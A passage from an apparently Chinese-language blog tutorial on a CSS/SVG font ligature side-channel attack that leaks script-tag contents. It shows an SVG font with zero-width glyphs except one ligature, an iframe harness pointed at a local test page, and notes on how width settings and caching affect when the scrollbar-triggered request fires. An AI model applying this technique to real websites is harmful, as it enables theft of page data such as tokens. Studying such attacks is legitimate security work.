class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'H'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'I'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'J'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'K'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'L'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'M'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'N'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'O'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'P'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Q'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'R'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'S'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'T'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'U'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'V'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'W'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'X'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Y'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'Z'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'['</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'\'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">']'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'^'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'_'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'`'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'a'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'b'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'c'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'d'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'e'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'f'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'g'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'h'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'i'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'j'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'k'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'l'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'m'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'n'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'o'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'p'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'q'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'r'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'s'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'t'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'u'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'v'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'w'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'x'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'y'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'z'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'{'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'|'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'}'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'~'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'"7'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'10000'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>也就是说这里构造了一个除了<code>"7</code>连字有一定宽度之外，其他字符都是0宽度。</p><p>第二个页面就是 font.html ，内容比较简单，构造一个适当宽度的 iframe 将 test.html 引入即可。</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:500px"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>至于 width 为 500 px，是<code>script</code>标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好… svg horiz-adv-x 的参数也不是越大就能触发…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120012326.png" alt=""></p><p>如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为<code>display:table</code>的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。</p><p>而且还有一些问题就是缓存的问题，效果如下：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" 